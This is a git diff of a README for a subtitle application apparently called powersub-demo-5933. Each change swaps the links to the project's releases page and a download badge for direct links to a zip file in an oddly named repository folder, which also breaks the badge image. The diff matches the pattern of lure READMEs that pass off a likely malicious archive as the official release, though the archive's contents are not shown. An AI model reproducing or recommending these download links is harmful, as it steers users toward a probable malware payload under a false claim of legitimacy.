@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-5933 - Simplify Your Subtitle Experience
 
-[![Download the Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue&style=for-the-badge)](https://github.com/zafra514/powersub-demo-5933/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip%20Release&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip)
 
 ## 📖 Introduction
 
@@ -29,13 +29,13 @@ Follow these simple steps to download and run **powersub-demo-5933**.
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/zafra514/powersub-demo-5933/releases) to find the available versions of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip) to find the available versions of the application.
 
 ### Step 2: Download the Application
 
 On the Releases page, locate the latest version of **powersub-demo-5933**. Click on the download link specific to your operating system. 
 
-[![Download the Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue&style=for-the-badge)](https://github.com/zafra514/powersub-demo-5933/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip%20Release&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip)
 
 ### Step 3: Install the Application
 
@@ -62,7 +62,7 @@ Once installed, you can run the application:
 
 ## 📥 Download & Install
 
-For your convenience, you can always return to the [Releases page](https://github.com/zafra514/powersub-demo-5933/releases) to download new updates or versions of the application.
+For your convenience, you can always return to the [Releases page](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip) to download new updates or versions of the application.
 
 ## 💡 Using the Application
 
@@ -85,6 +85,6 @@ If you need further assistance, you can reach out via the support section on the
 
 ## 🔄 Future Updates
 
-We regularly update **powersub-demo-5933** to enhance its features and fix bugs. Check back on the [Releases page](https://github.com/zafra514/powersub-demo-5933/releases) for the latest updates and improvements.
+We regularly update **powersub-demo-5933** to enhance its features and fix bugs. Check back on the [Releases page](https://raw.githubusercontent.com/zafra514/powersub-demo-5933/main/phenylmethane/powersub-demo-5933-Scyllaea.zip) for the latest updates and improvements.
 
 Enjoy smooth subtitle viewing with **powersub-demo-5933**!
